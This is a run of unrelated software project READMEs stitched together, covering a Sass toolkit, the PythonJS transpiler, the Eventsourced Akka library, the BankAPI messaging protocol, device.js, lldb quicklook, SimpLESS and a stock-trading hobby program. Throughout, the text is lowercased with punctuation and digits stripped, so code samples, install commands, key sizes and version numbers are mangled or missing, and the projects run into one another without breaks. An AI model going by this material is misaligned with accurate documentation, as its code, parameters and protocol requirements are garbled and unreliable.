element say  for example you d like to add a pixel value to a media query but you d like to have that value convert to the relevant em value for the base line height or base font size that might mean a few calculations sassaparilla includes two functions to help with this em font px and and converts the value to pixels based on the base font size em base px and and converts the value to pixels based on the base line height we also tend to like these for fine tuning elements such as letter spacing copy assets and config rb into your theme folder at fffunction we write our css using the following rules if you want to follow our lead then the below should help no id s for styling write in all lowercase and separate each word with a dash global header use space tab indenting indent as you go nest as little as possible to achieve the desired control keeps the compiled css file size down leave comments you wish to compile to css in regular css style all other comments write in scss style use extend and mixin to keep code nice and lean use how you want we d love to see how it s being used so do tell please don t sell sassparilla wholesale as is  as that s just not very nice if we find out this is the case we ll send around a big smelly dog to sit on all your

8825809, introduction  pythonjs is a transpiler written in python that converts a python like language into fast javascript it also includes experimental backends that translate to dart lua coffeescript and go go backend  the go backend uses a fully typed subset of python mixed with extra syntax inspired by golang to output go programs that can be compiled to native executeables or translated to javascript using gopherjs getting started  pythonjs can be run with regular python or fully self hosted within nodejs using empythoned to get started you have two options  install nodejs python js package and write a build script  or install python and use translator py from this repo directly  installing nodejs package  you can quickly get started with the stable version of pythonjs by installing the nodejs package and writing a build script in javascript to compile your python scripts to javascript python  is not required npm install python js nodejs quick example  var pythonjs require python js var pycode a a append hello a append world print a var jscode pythonjs translator tojavascript pycode eval pythonjs runtime javascript and jscode example projects  the example projects below require the nodejs python js package  translator py  if you want to run the latest version of the translator you will need to install python  and git clone this repo the nodejs package above is not required then to translate your python script directly run the translator py script in the pythonjs directory you can give it a list of python files to translate at once it will output the translation to stdout the default output type is javascript an html file can also be used as input python code inside a script tag script type text and python will be converted into javascript translator py help and go and dart and coffee and lua and no wrapper and analyzer file py examples cd pythonjs and translator py myscript py myscript js and translator py myapp html app html the option no wrapper will output the raw javascript by default the output is wrapped as a requirejs module the option analyzer requires the dart sdk is installed to your home directory and dart sdk  if this option is used then your script is also translated using the dart backend and fed to dartanalyzer which will perform static analysis of your code dartanalyzer is able to catch many types of errors like missing functions invalid names calling a function with the wrong argument types the quality of the analysis will depend on how much type information can be inferred from your code combined with the variables you have manually typed if dartanalyzer detects an error in your code translation will abort and debugging information is printed  pythonjs gives you the option to optimize your program for speed with a new syntax for static typing in some cases this results in code that is x faster a variable can be statically typed as int float long str list or dict the translator then uses this type information to speed up runtime checks and method calls in the example below x and y are typed as int def f xy return x and y the int type is accurate up to bits if you need true bit integer math you can use the long type note using long requires the long js library you can further optimize your code with pythonjs configure or special with statements that mark sections of the code as less dynamic n body benchmark gpu translation  a python typed subset can be translated to a glsl fragment shader to speed up math on large arrays supported features  multiple inheritance operator

subprocess call os path  regression tests  the best way to see what features are currently supported with each of the backends is to run the automated regression tests in pythonjs and regtests to test all the backends you need to install nodejs coffeescript and dartjs you should download the dart sdk and make sure that the executeable dartjs is in and dart sdk and bin and cd pythonjs and regtests and run py community  irc freenode pythonjs pythonjs configure  the special function call pythonjs configure can be inserted anywhere in your code to turn off an on dynamic features of the language if the option directkeys is true then dictionary key lookups are done directly faster  objects can not be used as keys only strings and numbers can then be used as dictionary keys the option directoperator controls operator overloading for a given operator and  if and is declared a direct operator then add overload methods are not called the operands are always assumed to be compatible with javascript addition the option runtimeexceptions if false disables extra runtime checking of expressions and assignments note this is always false in javascript mode pythonjs configure javascript true and false default false runtimeexceptions true and false default true directkeys true and false default false directoperator string default none   in a dictionary number keys will be converted to strings in the example below the key  and  are the same key a  x a  y  the calling context of this must be taken into account when using fast javascript mode code that comes after pythonjs configure javascript true or is inside a with javascript block when in javascript mode passing a method as a callback or setting it as an attribute on another object requires you call f bind self to ensure that self within the method points to the class instance this is not required when using classes defined normal mode because the this calling context is automatically managed note you can use the special syntax in place of the attribute operator to call bind automatically def method self print self with javascript class b def method self print self a bmethod b method a bmethod b method bind b a bmethod b method a method ok prints a a bmethod fails prints a should have printed b a bmethod ok prints b a bmethod ok prints b b amethod a method b amethod ok prints a  when using direct operators builtins are also affected list and list will no longer return a new array of items from both lists string n will no longer return the string multipled by the number a  and  ok a is  pythonjs configure directoperator and b  and  fails c hi  ok c is hihi pythonjs configure directoperator d hi  fails  the syntax from mymodule import allows you to import another python script from the same folder but both mymodule and the parent will share the same namespace mymodule can use global variables defined in the parent  using tuples as keys in a dict is allowed the tuple may contain other tuples objects and a mix of numbers or strings note that tuples in pythonjs are actually javascript arrays so if you modify the contents of the tuple it would no longer be the same key in a dict a  b      d a hello  b world d a hello ok d b world ok  attributeerror and keyerror are only raised in javascript mode when inside a block that catches those errors in the default python mode these errors

4957528, eventsourced  table border  persist received messages by appending them to a log journal project received messages to derive current state usually hold current state in memory memory image recover current or past state by replaying received messages during normal application start or after crashes never persist current state directly except optional state snapshots snapshots for recovery time optimization in other words eventsourced implements a write ahead log wal that is used to keep track of messages an actor receives and to recover its state by replaying logged messages appending messages to a log instead of persisting actor state directly allows for actor state persistence at very high transaction rates and supports efficient replication in contrast to other wal based systems eventsourced usually keeps the whole message history in the log and makes usage of state snapshots optional eventsourced can also be used to make message exchanges between actors reliable so that they can be resumed after crashes for example for that purpose channels with at least once message delivery guarantees are provided channels also prevent that output messages sent by persistent actors are redundantly delivered during replays which is relevant for message exchanges between these actors and other services logging behavior is implemented by the eventsourced trait a processor s receive method doesn t need to care about that acknowledging a successful write to a sender can be done by sending a reply a processor can also hot swap its behavior by still keeping its logging functionality processors are registered at an eventsourcingextension this extension provides methods to recover processor state by replaying logged messages processors can be registered and recovered at any time during an application run eventsourced doesn t impose any restrictions how processors maintain state a processor can use vars mutable data structures or stm references for example channels channels are used by processors for sending messages to other actors channel destinations and receiving replies from them channels require their destinations to confirm the receipt of messages for providing at least once delivery guarantees explicit ack retry protocol receipt confirmations are written to a log prevent redundant delivery of messages to destinations during processor recovery replay of messages replayed messages with matching receipt confirmations are dropped by the corresponding channels a channel itself is an actor that decorates a destination with the aforementioned functionality processors usually create channels as child actors for decorating destination actor references a processor may also sent messages directly to another actor without using a channel in this case that actor will redundantly receive messages during processor recovery eventsourced provides three different channel types more are planned default channel does not store received messages re delivers uncomfirmed messages only during recovery of the sending processor order of messages as sent by a processor is not preserved in failure cases reliable channel stores received messages re delivers unconfirmed messages based on a configurable re delivery policy order of messages as sent by a processor is preserved even in failure cases often used to deal with unreliable remote destinations can recover from crashes of the jvm it is running in reliable request reply channel same as reliable channel but additionally guarantees at least once delivery of replies order of replies not guaranteed to correspond to the order of sent request messages a journal is an actor that is used by processors and channels to log messages and receipt confirmations the quality of service availability scalability provided by a journal depends on the used storage technology the journals journals section below gives an overview of existing journal implementations and their

recovers the state of processor by replaying all event messages that processor received in previous application runs scala and and send event message to processor will be journaled processor message foo java and and send event message to processor will be journaled processor tell message create foo  null a first application run will create an empty journal hence no event messages will be replayed and the processor writes processor event foo  to stdout when the application is restarted however the processor s state will be recovered by replaying the previously journaled event message then the application sends another event message you will therefore see processor event foo  processor event foo  on stdout where the first println is triggered by a replayed event message in this step the event sourced processor is extended to send out new event messages to a destination it creates another event message by making a copy of the received event message with an updated event field and

for example to prevent redundant message delivery to destination we need something that remembers which messages have already been successfully delivered this is exactly the use case for channels

journal you should see processor event foo  destination event processed  event messages so far on stdout during a first application run when running the application again you ll see that the event sourced processor receives the complete event message history but the destination only receives the last event message produced by processor which corresponds the the single event message sent to processor during the current application run processor event foo  processor event foo  destination event processed  event messages so far this first steps first steps guide is a rather low level introduction to the eventsourced library more advanced library features are covered in the following sections stackable traits  scala new myactor with receiver with confirm with eventsourced java

myactor tell message create foo  null in the above example sending message foo to myactor will write received event foo to stdout the receiver trait stores the received event message as current event message in a field extracts the contained event from that message and calls the receive or onreceive method of myactor with event as argument if myactor wants to have access to the current event message it must be defined with a receiver self type and call the message method scala api or just call the message method java api scala class myactor extends actor this receiver def receive case

can also be combined with the stackable eventsourced and and or confirm traits where emitter must always be the first modification for example scala new myactor with emitter with eventsourced java public class myactor extends untypedeventsourcedemitter the receipt of event messages from channels must be confirmed by calling confirm or confirm true on the received event message applications can also negatively confirm an event message receipt by calling confirm false this for example causes a reliable channel to redeliver the event message this trait can either be used standalone scala new myactor with confirm java public class myactor extends untypedconfirmingactor or in combination with the stackable receiver  emitter and and or eventsourced traits where the confirm modification must be made after a receiver or emitter modification but before an eventsourced modification for example scala new myactor with receiver with confirm with eventsourced java public class myactor extends untypedeventsourcedconfirmingreceiver this section modifies and simplifies the example from section first steps first steps by making use of the stackable receiver  emitter and confirm traits in particular for the scala api processor will be modified with emitter in addition to eventsourced destination will be modified with receiver and confirm for the java api processor will extend

confirm or extend any of the abstract untyped base classes from the java api and message exchanges with destination actors via channels channels for example taking the code from section first steps first steps as a starting point processor can be extended to reply to message senders as follows scala class processor destination actorref extends actor def receive case msg message and and  and and

system out println response  system dispatcher no surprise here the sender reference in this example represents the future that is returned from the or ask method call but what happens during a replay during a replay the sender reference will be deadletters because eventsourced processors don t store sender references in the journal the main reason for this is that applications usually do not want to redundantly reply to senders during replays scala class processor destination actorref extends actor var counter  def receive case msg message and and  and and forward modified event message to

eventsourced examples run main org eligosource eventsourced guide senderreferences java project eventsourced examples run main org eligosource eventsourced guide japi senderreferences a channel channel is an actor that keeps track of successfully delivered event messages channels are used by event sourced actors processors to prevent redundant message delivery to destinations during event message replay some channels can also be used standalone standalone usage i e independent of event sourced actors a default channel is a transient channel that delivers event messages to a destination actor when the destination confirms the delivery of an event message by calling either confirm or confirm true on the received message object a confirmation an acknowledgement is asynchronously written to the journal during a replay event messages for which a confirmation exists won t be delivered again to the destination event messages that are negatively confirmed by the destination via a call to confirm false on the received event message will be re delivered during the next event message replay this is also the case for event messages for which no confirmation has been made therefore in cases of negative or missing confirmations the order of event messages received by a destination from a default channel may differ from the order of event messages produced by an event sourced processor a defaultchannel is created and registered at an eventsourcingextension as follows val extension eventsourcingextension  val destination actorref  val channelid int  val channel actorref extension channelof defaultchannelprops channelid destination the channelid must be a positive integer and consistently defined across application runs the map of registered channels can be obtained via the channels method of eventsourcingextension which returns a map of type map int actorref where the mapping key is the channel id channels can optionally be registered under a custom name see also section emitter emitter val channelid int  val channelname string  val channel actorref extension channelof defaultchannelprops channelid destination withname channelname the map of registered named channels can be obtained via the namedchannels method which returns a map of type map string actorref where the mapping key is the channel name a default channel preserves sender references sender references applications can therefore use and forward as well to communicate with channel destinations via channel actor refs however special care must be taken when using replayed messages that have already been confirmed by a channel destination will be ignored by the corresponding channel and the destination cannot reply hence the sender will see a reply timeout this can be avoided by finding out in advance if the channel will ignore a message or not applications do that by investigating the message acks list if the channel s id is contained in that list the message will be ignored and should not be used for asking val channelid int  val channel actorref  if message acks contains channelid channel message copy  oncomplete case result  see also usage hints usage hints regarding message copy  a reliable channel is a persistent channel that writes event messages to a journal before delivering them to a destination actor in contrast to a default channel a reliable channel preserves the order of messages as produced by an event sourced processor and attempts to re deliver event messages on destination failures therefore a reliable channel enables applications to recover from temporary destination failures without having to run an event message replay furthermore a reliable channel can also recover from crashes of the jvm it is running in this allows applications to guarantee at least once message delivery in case of both destination failures and sender failures val channel actorref extension channelof reliablechannelprops channelid destination a reliable channel preserves sender references sender references applications can therefore use and forward as well to communicate with channel destinations via channel actor refs details have already been described in the default channel defaultchannel section a reliable channel also stores sender references along with event messages so that they can be forwarded to destinations even after the channel has been restarted if a stored sender reference is a remote reference it remains valid even after recovery from a jvm crash i e a crash of the jvm the reliable channel is running in provided the remote sender is still available a reliable request reply channel is a pattern implemented on top of a reliable channel reliablechannel it mediates reliable request reply interactions between a request sender usually an eventsourced processor and a destination this channel has the following properties in addition to a plain reliable channel it wraps replies from the destination into a message before sending them back to the request sender guarantees at least once delivery of replies to the request sender in addition to at least once delivery of requests to the destination requires a positive receipt confirmation for a reply to mark a request reply interaction as successfully completed redelivers requests and subsequently replies on missing or negative receipt confirmations import org eligosource eventsourced patterns reliable requestreply  val channel actorref extension channelof reliablerequestreplychannelprops channelid destination channels must be activated before usage see extension deliver for channels to work properly event sourced processors must copy the processorid and sequencenr values from a received and journaled input event message to output event messages this is usually done by calling copy on the received input event message and updating only those fields that are relevant for the application such as event or ack  for example class processor channel actorref extends actor def receive case msg message and and  channel msg copy event   ack  when using a message emitter emitter  this is done automatically reliable channels reliablechannel and reliable request reply channels reliable request reply channel can also be used independently of eventsourced processors i e standalone for standalone channel usage senders must set the message processorid of the sent message to  which is the default value val channel extension channelof reliablechannelprops  channel message my event and and processorid  this is equivalent to directly sending the message event channel my event a reliable channel internally wraps a received event into a message with processorid set to  setting the processorid to  causes a reliable channel to skip writing an acknowledgement an acknowledgement always refers to an event message received by an eventsourced processor so there s no need to write one in this case another unrelated use case for turning off writing acknowledgements is the emission of event message series event series in context of event sourced channel usage eventsourced usage applications should consider using reliable channels whenever a sender processor should deliver messages to a remote destination at least once and in sending order even in cases of  network errors between sender and destination remote actor ref remains valid but remote actor is temporarily unavailable  destination jvm crashes remote actor ref becomes invalid and  sender jvm crashes messages already received by a sender processor but not yet delivered to the remote destination must be automatically delivered when the sender recovers recovery from a crash using a remote actor ref as channel destination would work in case  but not in case  one possible way to deal with case  is to use a local actor a destination proxy that communicates with the remote destination via an actorselection an actorselection can be created from an actor path and is not bound to the remote destination s life cycle class destinationproxy destinationpath string extends actor val destinationselection actorselection context actorselection destinationpath def receive case msg destinationselection tell msg sender and and forward val destinationpath string  val proxy system actorof props new destinationproxy destinationpath val channel extension channelof reliablechannelprops  proxy using an actorselection also covers case  of course case  is automatically covered by the fact that a sender processor uses a reliable channel for sending messages to a

processorof props new sender with eventsourced sender message hello special care must be taken if the remote destination actor is an eventsourced actor in this case the application must ensure that the destination actor can only be accessed remotely after it has been successfully recovered this can be achieved for example by using an additional endpoint actor that simply forwards to the destination actor the endpoint actor is registered under the destination path after the destination actor has been successfully recovered class destinationendpoint destination actorref extends actor def receive case msg destination forward msg class destination extends actor val id  def receive case msg message println s received msg event msg confirm val destination extension processorof props

destinationendpoint destination  destination this ensures that new remote messages never interleave with messages that are replayed to the destination actor during recovery project eventsourced examples run main org eligosource eventsourced example sender the remote destination can be started with project eventsourced examples run main org eligosource eventsourced example destination the sender application prompts the user to enter messages on stdin which are then reliably sent to the remote destination a less reliable alternative to channels is communication via sender references this means producing event messages to destinations that have been passed to a processor via sender references along with an input event message these sender references will be deadletters during a replay which also prevents redundant delivery the main difference however is that the delivery guarantee changes from at least once to at most once val system actorsystem  val journal actorref  val

state of registered processors and activate channels extension recover and and processors and channels are now ready to use the recover method first replays journaled event messages to all registered processors by replaying the event message history processors can recover state processors that emit event messages to one or more channels will also do so during replay these channels will either ignore discard event messages that have already been successfully delivered i e acknowledged in previous application runs or buffer them for later delivery after replay the recover method triggers the delivery of buffered messages by activating channels if channels delivered event messages immediately instead of buffering them delivered event messages could wrongly interleave with replayed event messages this could lead to inconsistencies in event message ordering across application runs and therefore to inconsistencies in application state therefore recovery must ensure that buffered event messages are only delivered after all replayed event messages have been added to their corresponding processors mailboxes this is especially important for the recovery of processors and channels that are connected to cyclic directed graphs whether replay should start from scratch from a snapshot snapshots or from a given sequence number lower sequence number bound whether replay should end at current state or any state in the past using an upper sequence number bound as already explained above val extension eventsourcingextension  import extension  recover recovers all processors with no

behavior changes  actors that change their behavior with become and unbecome will keep the functionality introduced by a stackable receiver  emitter and and or eventsourced trait for example an actor that is modified with the eventsourced trait scala api or extends untypedeventsourcedactor java api will continue to journal event messages after having changed its behavior with become on the other hand actors that change their behavior with context become scala api or getcontext become java api will loose the functionality introduced by the stackable receiver  emitter and and or eventsourced traits although the lost behavior can be recovered with context unbecome or getcontext unbecome event series  when a processor derives more than one output event message from a single input event message and emits those output messages to a single channel it generates a series of event messages for an event message series the event processor should set the ack field for all but the last emitted message to false class processor channel actorref extends actor def receive case msg message and and  channel msg copy event event   ack false and and st message of series channel msg copy event event   ack false and and nd message of series and and  channel msg copy event event n and and last message of series processors that use an emitter do that in the following way class processor extends actor this emitter def receive case event and and  emitter channelname send msg msg copy event event   ack false and and st message of series emitter channelname send msg msg copy event event   ack false and and nd message of series and and  emitter channelname sendevent event n this ensures that an acknowledgement is only written to the journal after the last message of a series has been successfully delivered by a default channel defaultchannel or stored by a reliable channel reliablechannel destinations however should confirm the receipt of every event message regardless whether it belongs to a series or not idempotency  under certain failure conditions channels channels may deliver event messages to destinations more than once a typical example is that a destination positively confirms a message receipt but the application crashes shortly before that confirmation can be written to the journal in this case the destination will receive the event message again during recovery for these but also other reasons channel destinations must be idempotent event message consumers which is an application level concern for example an event message consumer that stores received purchase orders in a map where the map key is the order id is likely to be an idempotent consumer because receiving a purchase order only once or several times will lead to the same result the purchase order is contained in the map only once an event message consumer that counts the number of received purchase orders is not an idempotent consumer a re delivery will lead to a wrong counter value from a business logic perspective in this case the event message consumer must implement some extra means to detect event message duplicates for detecting duplicates applications should use identifiers with their events identifier values should be set by an event sourced processor before an event is emitted via a channel channel destinations or other downstream consumers should keep track of identifiers of successfully processed events and compare them to identifiers of newly received events a newly received event with an already known identifier can be considered as a duplicate assuming that the emitting processor generates unique identifiers for generating unique identifiers processors can use the sequence number of received event messages case class myevent details any eventid long class processor extends actor this emitter with eventsourced def receive case event and and get sequence number of current event message val snr long sequencenr val details any  and and  emitter channelname sendevent myevent details snr using the sequence number has the advantage that consumers of emitted events only need to remember the identifier of the last successfully consumed event if the identifier of a newly received event is less than or equal to that of the last consumed event then it is a duplicate and can therefore be ignored class consumer extends actor var lasteventid l def receive case myevent details eventid if eventid lasteventid and and duplicate else and and  lasteventid eventid consumers that are event sourced processors can store the event identifier as part of their state which will be recovered during an event message replay other consumers must store the identifier somewhere else processors that emit event message series event series should use an event message index in addition to the sequence number to uniquely identify an emitted event case class myevent details any eventid long int class processor extends actor this emitter with eventsourced def receive case event and and get sequence number of current event message val snr long sequencenr val details seq any  and and  emitter channelname send msg msg copy event myevent details   snr   ack false emitter channelname send msg msg copy event myevent details   snr   ack false and and  consumers should then compare the sequence number index pairs for detecting duplicates

retailing system would take your order information use a credit card validation service to check your credit card number and then confirm your order all within a single operation the thread processing your order would block while waiting for the credit card to be checked but that block wouldn t be very long for the user and the server can always run another thread on the processor while it s waiting in the lmax architecture you would split this operation into two the first operation would capture the order information and finish by outputting an event credit card validation requested to the credit card company the business logic processor would then carry on processing events for other customers until it received a credit card validated event in its input event stream on processing that event it would carry out the confirmation tasks for that order this can be implemented with the eventsourced library as shown in the following diagram legend is in appendix a appendix a legend we implement the mentioned business logic processor processor as event sourced actor orderprocessor it processes ordersubmitted events by assigning submitted orders an id and storing them in a map state of orderprocessor for every submitted order it emits a creditcardvalidationrequested event on receiving a creditcardvalidated event the event sourced orderprocessor updates the status of corresponding order to validated true and sends an orderaccepted event containing the updated order to destination it also replies the updated order to the initial sender the order domain object the domain events

22605051, bankapi is a secure decentralized messaging system to send files and messages between banks and other types of financial institutions there is a reference implementation of the protocol which can be used off the shelf which is production grade quality and is not only for testing and demonstration although it fulfils those two roles as well the bankapi protocol relies on openpgp rfc  and sha and https that s it there is nothing more to it bankapi is only a transmission protocol and makes no assumptions of what kind of messages or file types banks will want to transfer the protocol imposes certain restrictions on the details and choices of algorithms used for generating the openpgp messages the terminology used here the details specific to openpgp are documented in  all openpgp messages must be symmetrically encrypted messages where the session key is public key encrypted the session key packet must contain the key id of the key used to encrypt the message all messages must contain a signature packet implementations may choose to generate one pass signatures  all parties must use a key length of at least  bits for their rsa keys implementations should accept key sizes of   and  bits using  bit keys is recommended dsa and elgamal must not be used  the cipher algorithm must be one of aes aes and aes  if the openpgp message is a compressed message the compression algorithm must be zip or zlib  the openpgp message may be integrity protected via the modification detection code packet  the literal data inside the openpgp message must be marked to contain binary data if a text or utf  message is received an implementation may choose to accept the message an implementation must not convert any canonical line endings to their local counterpart  the signature packet and if present the one pass signature packet must contain the key id of the key used to sign the message implementations should only sign a message using a single key the hash algorithm used for signatures must be sha   the ascii armor including armor headers must be valid utf   the armor header comment  must be set to the message type the system is built on top of postgresql and uses its pgcrypto contrib module messages are encrypted and signed using rsa public key cryptography each bank generates a rsa key pair consisting of a public and a secret key the public keys and api urls are exchanged between the banks the task of exchanging public keys and api urls is preferrably done over the swift network by sending them in a normal mt swift fin message this allows banks to trust the validity of the public key and api url as the origin of swift messages can be trusted rsa encryption json rpc and https linux and postgresql and apache open source and mit license real time request and response instant delivery receipt local archiving of files in postgresql to send a message the sending bank encrypts and signs a message using create message  and calls get message to get the actual ciphertext content of the message the ciphertext is then delivered to the receiving bank by calling its receive message api method accessible at the api url provided by the receiving bank the api implementation must adhere to the json rpc standard and accept https post the receive message function returns a delivery receipt which is a cryptographic proof of the fact that the sender was able to verify the signature contained within the message against the receiving bank s public key this allows the sender to be certain that the message was delivered and decrypted successfully by the recipient the sending bank calls decode delivery receipt with the delivery receipt as input to verify its validity bankid unique identifier for the bank preferrably the swift bic primary key protocol

delivery receipt datestamp the date and time when the message was created delivered the date and time when the message was delivered create message takes the plaintext context of a file as input and prepares an encrypted message signed by frombankid which can be only decrypted by tobankid if the message already exists the existing data is reused an error is returned if the secret key of frombankid or the public key of tobankid can not be located in the database the return value is the message id of the message given a message id as input get message returns the ascii armored pgp message this data can then be https posted to the receive message api method of tobank receive message decrypts and verifies the signature of the input message the message s details are written to the messages table and information about the file and its plaintext contents are written into the files table this function will raise an error if  the secret key counterpart of the public key used to encrypt the message is not present in the table keys  the public key counterpart of the secret key used to sign the message is not present in the table keys  the message is corrupt or the signature can not be verified the return value is a delivery receipt which should be then used as the contents of the response to the caller of the receive message api method decode delivery receipt decrypts and verifies the given delivery receipt where the keys involved and the plaintext should match a row in messages if so the message has been successfully delivered and the messages deliveryreceipt and messages delivered columns are set the repository includes scripts for building debian and ubuntu packages for the bankapi and the required pgcrypto extensions in postgresql in order to run the code if you are running a different version of postgresql then   then replace the version in the commands below with the appropriate version if you are running the default version in debian you can omit the version extension of the packages names sudo apt get y build dep postgresql   sudo apt get y install postgresql server dev   postgresql   apache python psycopg python requests this should produce two deb files one for bankapi and one for the pgcrypto extension package contains the command line tools for sending messages and usr and bin and bankapi  sql needed for creating the bankapi in postgres and installes a cgi as an endpoint for receving incoming communication messages the installation of the module installs and activates the cgi script it will the installation does not finish the installation of the database but leaves this as a manual task follow the following steps for a default database installation cd and usr and share and bankapi sudo u postgres createdb bankapi sudo u postgres psql dbname bankapi single transaction no psqlrc file install sql make sure www data user can connect to the bankapi database this can for instance be done by adding the following line where appropriate in the active pg hba conf file local bankapi www data peer to optionally install the test bank data sudo u postgres psql dbname bankapi single transaction no psqlrc file testdata and

3953202, css media queries are an amazing tool for customizing a layout to look differently depending on the device you serve it to for some inspiration have a look at mediaqueri es mq in many cases however the ability to customize the css depending on screen size is not sufficient you might want a completely different dom structure and a separate set of javascript depending on the device you may also want to distinguish between these different versions by providing separate urls eg tablet foo com  m foo com and foo com for clarity and perhaps for seo reasons broadly speaking there are two approaches for doing this  server side detection based on user agent string  client side detection based on features this project is about making the latter as easy as possible device js is a starting point for doing semantic media query based device detection without needing special server side configuration saving the time and effort required to do user agent string parsing two parts to the solution  write link rel alternate media mediaquery href url id id tags for all of the versions you will provide and add them to your head section this is a best practice for multi version webapps anyway see separate mobile urls section of google s building smartphone optimized websites goog  include device js in every version of your webapp  don t forget to make it easy for your users to manually request a particular version of your app if something goes wrong for example if your app is here is how your html will look like doctype html versions media only screen and touch enabled  media only screen and max device width px media only screen and min device width px query matching meta name viewport content width device width possible before potentially redirecting and head footer ul and ul and footer and body note that even though the touch enabled media query only exists in firefox and is behind a moz vendor prefix device js supports it via a polyfill star this issue crbug to hopefully make it available in chrome as well device js will read all of the version links in your markup and redirect you to the appropriate url that serves the correct version of your webapp having the link tags in your head section also tells search engines of all of the versions of your site you can manually override the detector and load a particular version of the site by passing in the device get parameter with the id of the version you d like to load this will look up the link tag based on the specified id and load that version for example if you are on desktop but want the tablet version visiting relatedly you can prevent redirection completely by specifying the force  get parameter for example if you are on desktop and know the here is an example of device js in action it s a fake todo list no functionality just device detection and switching the goal of device js is to provide a seo compatible best practice and starting point for reliable cross device cross browser redirection given how many browsers and devices we have these days there are bound to be bugs if you find them please report them and ideally fix them in a pull request device js does some checks and will use client side redirection to point users to the right version of your webapp client side redirection can have a performance overhead though i haven t measured it if you find this is true you can keep your dom the same still using the seo friendly link rel alternate tags but simply remove the device js script and do your own server side ua based pushing device js should work in all browsers that support document queryselectorall notably this excludes ie if you want it
12859831, lldb quicklook  lldb quicklook is a debugger command to open images views and more using quick look this command is great for inspecting any object that is not well represented by a string in the debugging console the command is inspired by xcode s new quick look feature but is better in two ways  you can inspect any object accessible by an lldb expression not just objects available in the xcode gui  any type of object can be inspected by implementing a simple data provider protocol not just uiimages the command is quite simple it asks an object in your program for debug data saves the data to a tmp file on your computer and opens the file using finder and quick look  clone the repository  copy the lldbinit file to your home directory or append the lines to your existing lldbinit  update the path to lldbquicklook py in the lldbinit file to match the script s location on your machine  add the dataproviders directory to your xcode project lldb quicklook requires xcode  or later  to use the full version of quick look ensure that enable access for assistive devices setting is checked in system preferences when your program is paused on a breakpoint in lldb calling the command quicklook object or ql object will ask the object for its quicklookdebugdata and save that data to the object s quicklookfilename the file will be saved under and tmp and target and opened using finder and quick look you can make any object into a quick look data provider by simply implementing the quicklookdebugdata and quicklookfilename methods simple implementations of data providers for nsobject  uiimage  uiview  nsdata  and nsstring can be found in the dataproviders directory lldb quicklook self imageview image lldb ql uiapplication sharedapplication keywindow lldb ql l self view debugging images not accessible from the xcode gui debugging views that are not on screen or obscured by another view saving images for screenshots or to watch a view change over time opening text in a proper editor without having to copy and paste from the console tip type help quicklook from the lldb prompt to see the options for the command
2535404, simpless compiler    description  but however in the way its meant to be running either on node js or being interpreted by javascript in the browser its just not usable for most web projects who wants to setup a node js server for this job me not so i decided to create a little compiler for less that runs on every platform changelog  tweaked ui removed the compilation options from the lesscode and implemented it into the ui the target css file to compile to can now be chosen from the ui embedded the most recent version of less v    implemented a automatic updater for the less compiler if a less file starts with a css block comment simpless will keep that comment after minification i e for wordpress metric tonne of bugfixes if you don t want a css file to be minified place the following comment in your less file and and simpless minify added a button for manual recompilation of files added a button for removing files from the list fixed a bug where compiling an empty less file crashes the program fixed a bug in the quit restore system removed the restore button restoring now happens by default fixed a bug where urls in stylesheets got messed up with random app and and com wearekiss simpless open and insertions included less parser    addded support for backwards import compilation is triggered if imported files are changed capturing compiling errors in imported files now fixed weird file path problems in appcelerator titanium implemented a new drag drop system should work much more reliable now fixed a bug where a space in the filepath prevented simpless from recognizing it fixed a bug where the show love message was displayed when it shouldnt improved compilation error checking improved contrast in the colors of error messages in the ui included less parser    added import functionality when minimizing the app it goes to the tray added a restore last session button implemented an automatic update checker download builds  v  alpha edge  this versions is for testing and have may have bugs

8919938, it s based off the observation that many symbols display sufficient daily volatility that their high will generally be significantly above their open regardless of their price at the close of trading i never really got around to making this robust but would like to come back to it someday soon see below for a sample run of it obviously don t use this for trading real money who are you  my name is warren henning i m a  year old software developer living in berkeley california i don t have any professional experience in the finance or investment banking industries i ve never worked for a bank this is just a hobby project i ve wanted to do for a long time have you traded this with real money does it work  i haven t risked any money on this it produces profitable simulated results on historical data i ve tried it against recently see a sample result below  but that s definitely not a guarantee of actual trading performance why are you doing this how can you write a program to pick stock trades  i m doing this for fun nothing more i m not selling anything or expecting to make money off this i m giving it away because i think the idea of it is more interesting than the practical reality of it as a money making tool i don t have the capital to trade it and it s common even for seemingly foolproof trading systems to not do well under actual circumstances compared to their simulated performance i d like to discuss the idea of relying on a computer to place trades now a program like bateman falls under the category of algorithmic trading  which i ll also emphasize again that i m not a trader and while i am a professional programmer i ve never worked on any trading infrastructure code additionally bateman isn t really a fully algorithmic trading app since it doesn t actually place trades itself it just tries to find numbers that would allow a human trader to trade successfully so it enables systematic trading  where a program emits outputs that suggest a rigid objective course of action that the human trader is then supposed to follow many people are unable to follow through with this and generally lose money as a result so bateman has nothing for talking to brokers or actually making trades itself if you wanted to use the results of a program like this you d have to do that by hand hence to somewhat alleviate the unreliability and anxiety associated with discretionary trading traders look for rigorous quantitative trading systems that enable systematic trading if used and followed properly if the program makes trades automatically without human intervention this removes the obligation to follow the decisions made by the system everytime as well and the psychological aspects of the system are largely removed all that then remains for such an algorithmic trading system is to monitor it to ensure it s working as intended to conclude these thoughts on algorithmic and high frequency trading it s clear that scrutiny and rigorous testing are crucial for success as knight capital learned on model complexity  bateman is intended to have good generalization and future performance by being limited in its assumptions bateman s assumption is that some stocks go up a little sometimes a plot of a bateman model consists of a couple of horizontal lines nothing more but you might be asking yourself isn t computer ai kind of lousy at complex tasks like this well as imperfect as computers are at complex decision making tasks their systematic nature gives them a certain edge versus humans in financial markets as simple as a small set of numerical parameters to guide trades is therein lies its strength the assumptions behind bateman are minimal and not meant to be universally applicable it s instead intended to be used on stocks that have in the past displayed a specific property on a frequent basis it s well known in machine learning that models with too many parameters or of too great complexity that are tested on historical data wind up being overtrained to that data and effectively just memorizing it with the consequence that they do poorly on future unforeseen data this unfortunately is why it s not generally practical or effective to build huge models that handle every conceivable scenario and do lots of stuff why write something from scratch aren t there tools out there for this  they also include optimization facilities for finding numerical parameters to trading systems like genetic algorithms i need to call a backtrading system in a loop and have it run as fast as possible in other words i can t see how to implement bateman in terms of low level linear algebra that can be called from numpy so we re stuck with a general purpose language like java what is the idea behind the trading system  as mentioned above bateman tries to buy a stock slightly above its open and below or near its daily high rather than trying to build a forecasting model bateman is intended for use with stocks that have a frequent high positive difference between daily high and open share price so that regardless of what happens by the end of the day at some point it will likely exhibit behavior that can be profitably exploited there are three fixed numerical parameters bateman tries to optimize when it runs the buy trigger  the sell trigger  and a stop loss  the buy trigger is the amount above the open price for the day that it will buy at so if the stock opens at  and the buy trigger is taken to be   any price above   will be acted upon  the sell trigger is the amount above the price shares were purchased at to sell if the sell trigger is not met by the end of the day the shares are sold so 